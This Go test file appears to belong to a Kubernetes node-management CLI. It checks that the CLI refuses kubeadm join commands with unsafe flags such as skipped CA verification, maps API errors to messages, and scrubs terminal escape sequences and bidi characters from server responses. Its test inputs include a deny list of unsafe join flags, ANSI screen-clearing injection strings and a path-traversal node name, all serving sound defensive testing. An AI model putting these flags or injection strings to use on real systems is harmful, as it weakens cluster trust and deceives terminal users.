		"--discovery-token-unsafe-skip-ca-verification": "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash " + caPin + " --discovery-token-unsafe-skip-ca-verification --node-name box-1",
		"--ignore-preflight-errors":                     "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash " + caPin + " --ignore-preflight-errors=all --node-name box-1",
	}
	for flag, line := range cases {
		h := newHarness(t)
		mustErr(t, h.ctx.AssertJoinCommand(line))
		// The number of the word, never its text.
		mustContain(t, h.output(), "kubehz: word 6 of the join command is a flag this CLI will not run.\n")
		mustNotContain(t, h.output(), flag)
	}
	h := newHarness(t)
	mustOK(t, h.ctx.AssertJoinCommand("kubeadm join cp.example.test:6443 --token "+joinToken+" --discovery-token-ca-cert-hash "+caPin+" --node-name box-1"), h.output())
	mustOK(t, h.ctx.AssertJoinCommand("kubeadm join cp.example.test:6443 --token "+joinToken+" --discovery-token-ca-cert-hash "+caPin+" --discovery-token-ca-cert-hash "+caPin2+" --node-name box-1"), h.output())
	mustErr(t, h.ctx.AssertJoinCommand("kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --node-name box-1"))
	mustContain(t, h.output(), "pins no CA fingerprint")
	h.reset()
	mustErr(t, h.ctx.AssertJoinCommand("kubeadm join not-an-endpoint --token "+joinToken+" --discovery-token-ca-cert-hash "+caPin+" --node-name box-1"))
	mustContain(t, h.output(), "not a host:port")
}

func TestNodeJoinPostMintRefusalsNameTheSlot(t *testing.T) {
	h := joinWithMint(t, `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash `+caPin+` --discovery-token-unsafe-skip-ca-verification --node-name box-1","expiresAt":"x","ready":true}}`)
	mustContain(t, h.output(), "kubehz: word 6 of the join command is a flag this CLI will not run.\n")
	mustNotContain(t, h.output(), "--discovery-token-unsafe-skip-ca-verification")
	mustContain(t, h.output(), "holds a node slot")
	mustContain(t, h.output(), "lo kubehz node remove --name box-1")

	h = joinWithMint(t, `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --node-name box-1","expiresAt":"x","ready":true}}`)
	mustContain(t, h.output(), "pins no CA fingerprint")
	mustContain(t, h.output(), "holds a node slot")

	h = joinWithMint(t, `{"ok":true,"data":{"token":"a1b2c3.d4e5f6g7h8i9j0k1","expiresAt":"x"}}`)
	mustContain(t, h.output(), "returned no join command")
	mustContain(t, h.output(), "holds a node slot")

	h = joinWithMint(t, `<html><body>502 Bad Gateway</body></html>`)
	mustContain(t, h.output(), "returned no join command")
	mustContain(t, h.output(), "holds a node slot")
}

// ── the api's refusal vocabulary ─────────────────────────

func TestNodeErrorVocabulary(t *testing.T) {
	cases := []struct {
		code  int
		body  string
		wants []string
	}{
		{400, `{"ok":false,"data":{"code":"STATIC_POOLS_NOT_ENABLED","message":"static pools are not enabled"}}`, []string{"staticPoolsEnabled", "kubehz support"}},
		{400, `{"ok":false,"data":{"code":"KUBELET_BELOW_FLOOR","message":"v1.29.0 is below the floor v1.31"}}`, []string{"kubelet on this machine is too old", "v1.29.0 is below the floor v1.31", "two minor versions"}},
		{403, `{"ok":false,"data":{"code":"QUOTA_EXCEEDED","message":"20 of 20 nodes"}}`, []string{"no free slot", "lo kubehz node remove --name"}},
		{409, `{"ok":false,"data":{"code":"CONTROL_PLANE_NOT_READY","message":"no discovery"}}`, []string{"has not published its join address", "kind: static"}},
		{409, `{"ok":false,"data":{"code":"NODE_EXISTS","message":"box-1 exists"}}`, []string{"already holds a node with that name", "--name", "lo kubehz node remove"}},
		{409, `{"ok":false,"data":{"code":"POOL_NOT_STATIC","message":"metal is a machineDeployment pool"}}`, []string{"kind: static"}},
		{403, `{"ok":false,"data":{"code":"STEP_UP_REQUIRED","message":"fresh sign-in required"}}`, []string{"KUBEHZ_TOKEN"}},
		{418, `{"ok":false,"data":{"code":"SOMETHING_NEW","message":"the api knows best","help":"read the docs"}}`, []string{"the api knows best", "read the docs"}},
	}
	for _, tc := range cases {
		s := defaultNodeStubs()
		s.mintCode, s.mintBody = tc.code, tc.body
		h := nodeHarness(t, s, "hosted", "")
		mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
		for _, w := range tc.wants {
			mustContain(t, h.output(), w)
		}
	}
}

// ── remove ───────────────────────────────────────────────

func TestNodeRemove(t *testing.T) {
	t.Parallel()
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeRemove(t.Context(), "acme.example.org", NodeOpts{Name: "box-1"}), h.output())
	for _, w := range []string{"node 'box-1' is draining (pool metal).", "slot is free", "never the hardware", "kubeadm reset"} {
		mustContain(t, h.output(), w)
	}
	if !h.anyReq("DELETE", "/api/clusters/cl-1234abcd/nodes/box-1") {
		t.Fatal("no DELETE")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustErr(t, h.ctx.NodeRemove(t.Context(), "acme.example.org", NodeOpts{Name: "../../clusters"}))
	mustContain(t, h.output(), "is not a node name the platform accepts")
	if len(h.reqs()) != 0 {
		t.Fatal("no request for a bad name")
	}

	s := defaultNodeStubs()
	s.removeCode, s.removeBody = 404, `{"ok":false,"data":{"code":"NOT_FOUND","message":"Node not found on this cluster"}}`
	h = nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeRemove(t.Context(), "acme.example.org", NodeOpts{Name: "box-1"}))
	mustContain(t, h.output(), "holds no node named 'box-1'")
	mustContain(t, h.output(), "lo kubehz node status")
}

// ── status ───────────────────────────────────────────────

func TestNodeStatus(t *testing.T) {
	t.Parallel()
	s := defaultNodeStubs()
	s.nodesBody = `{"ok":true,"data":{"nodes":[{"name":"box-1","pool":"metal","status":"Ready","joinedAt":"2026-08-30T10:00:00Z"},{"name":"box-2","pool":"metal","status":"Joining","joinedAt":null}],"usage":{"nodes":2,"maxStaticNodes":20},"discoveryReady":true}}`
	h := nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeStatus(t.Context(), "acme.example.org", NodeOpts{}), h.output())
	for _, w := range []string{"Cluster: cl-1234abcd (acme.example.org)", "Nodes:   2/20", "NAME", "box-1", "Ready", "2026-08-30T10:00:00Z", "box-2", "Joining"} {
		mustContain(t, h.output(), w)
	}
	mustContain(t, h.output(), "  box-2                    metal            Joining    -")
	mustNotContain(t, h.output(), "has not published its join address")

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeStatus(t.Context(), "acme.example.org", NodeOpts{}), h.output())
	mustContain(t, h.output(), "No nodes yet")
	mustContain(t, h.output(), "lo kubehz node join --pool")

	s.nodesBody = `{"ok":true,"data":{"nodes":[],"usage":{"nodes":0,"maxStaticNodes":20},"discoveryReady":false}}`
	h = nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeStatus(t.Context(), "acme.example.org", NodeOpts{}), h.output())
	mustContain(t, h.output(), "has not published its join address")
}

// ── server strings on the terminal ───────────────────────

func TestNodeScrubsANSI(t *testing.T) {
	s := defaultNodeStubs()
	s.mintBody = `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token ` + joinToken + ` --discovery-token-ca-cert-hash ` + caPin + ` --node-name box-1","expiresAt":"2026-09-01T12:00:00Z\u001b[2J\u001b[Hpwned\u009b\u2028\u202e","ready":true}}`
	h := nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "2026-09-01T12:00:00Z[2J[Hpwned")
	mustNotContain(t, h.output(), "\033")
	for _, bad := range []string{"\u009b", "\u2028", "\u202e"} {
		mustNotContain(t, h.output(), bad)
	}

	s = defaultNodeStubs()
	s.mintCode, s.mintBody = 400, `{"ok":false,"data":{"code":"KUBELET_BELOW_FLOOR","message":"v1.29.0 is below\u001b[31m\u009b\u2028\u202e the floor"}}`
	h = nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeJoin(t.Context(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "v1.29.0 is below[31m the floor")
	mustNotContain(t, h.output(), "\033[31m")
	for _, bad := range []string{"\u009b", "\u2028", "\u202e"} {
		mustNotContain(t, h.output(), bad)
	}

	s = defaultNodeStubs()
	s.removeBody = `{"ok":true,"data":{"name":"box-1","pool":"metal\u001b[2J\u009b\u2028\u202e","status":"Draining"}}`
	h = nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeRemove(t.Context(), "acme.example.org", NodeOpts{Name: "box-1"}), h.output())
	mustContain(t, h.output(), "pool metal[2J")
	for _, bad := range []string{"\033", "\u009b", "\u2028", "\u202e"} {
		mustNotContain(t, h.output(), bad)
	}

	s = defaultNodeStubs()
	s.nodesBody = `{"ok":true,"data":{"nodes":[{"name":"box-\u001b[31m\u009b\u202e1","pool":"metal","status":"Ready","joinedAt":"2026-08-30T10:00:00Z"},{"name":"box-2","pool":"metal\u2028","status":"Ready","joinedAt":"2026-08-31T10:00:00Z"}],"usage":{"nodes":"2\u009b","maxStaticNodes":"2\u20280\u202e"},"discoveryReady":true}}`
	h = nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeStatus(t.Context(), "acme.example.org", NodeOpts{}), h.output())
	// One row each, in the columns (the bash twin scrubs the TSV rows as one
	// block: it keeps the tab and the newline).
	mustContain(t, h.output(), "\n  box-[31m1                metal            Ready      2026-08-30T10:00:00Z\n")
	mustContain(t, h.output(), "\n  box-2                    metal            Ready      2026-08-31T10:00:00Z\n")
	// The usage counts are server strings too.
	mustContain(t, h.output(), "Nodes:   2/20\n")
	for _, bad := range []string{"\033", "\u009b", "\u2028", "\u202e"} {
		mustNotContain(t, h.output(), bad)
	}
}

// scrub drops each character that ui.Shown shows as '?' (ui.Unshown), but
// keeps a tab, a newline and a backslash. For each case of the shared table
// (internal/ui/testdata/shown.json), the input without each other character
// that the case's result shows as '?' is what scrub gives. The bash twin is
// the test "scrub: drops each character ..." in kubehz_shared_test.bats.
func TestScrubDropsEachUnshownCharacterButTabAndNewline(t *testing.T) {
	t.Parallel()
	raw, err := os.ReadFile(filepath.Join("..", "ui", "testdata", "shown.json"))
	if err != nil {
		t.Fatal(err)
	}
	var cases []struct{ Case, In, Want string }
	if err := json.Unmarshal(raw, &cases); err != nil {
		t.Fatal(err)
	}
	dropped := 0
	for _, c := range cases {
		in, shown := []rune(c.In), []rune(c.Want)
		if len(in) != len(shown) {
			t.Fatalf("%s: in and want differ in length", c.Case)
		}
		var want []rune
		for i, r := range in {
			if shown[i] != '?' || r == '?' || r == '\\' || r == '\t' || r == '\n' {
				want = append(want, r)
			}
		}
		got := scrub(c.In)
		if got != c.In {
			dropped++
		}
		if got != string(want) {
			t.Errorf("%s: scrub(%q) = %q, want %q", c.Case, c.In, got, string(want))
		}
	}
	// The table drops something: else the test proves nothing.
	if dropped < 15 {
		t.Fatalf("scrub changed %d cases of the table, want 15 or more", dropped)
	}
	// The characters of the item (a C1 CSI, a line separator, a bidi
	// override, an ESC) go; a tab and a newline stay.
	if got, want := scrub("a\u009bb\u2028c\u202ed\te\nf\x1b[2Jg"), "abcd\te\nf[2Jg"; got != want {
		t.Errorf("scrub = %q, want %q", got, want)
	}
}

func TestRejectGlobalClusterFlag(t *testing.T) {
	t.Parallel()
	h := newHarness(t)
	mustErr(t, h.ctx.RejectGlobalClusterFlag())
	mustContain(t, h.output(), "--cluster/-s names the kind cluster")
	mustContain(t, h.output(), "--cluster-id cl-xxxxxxxx")
}
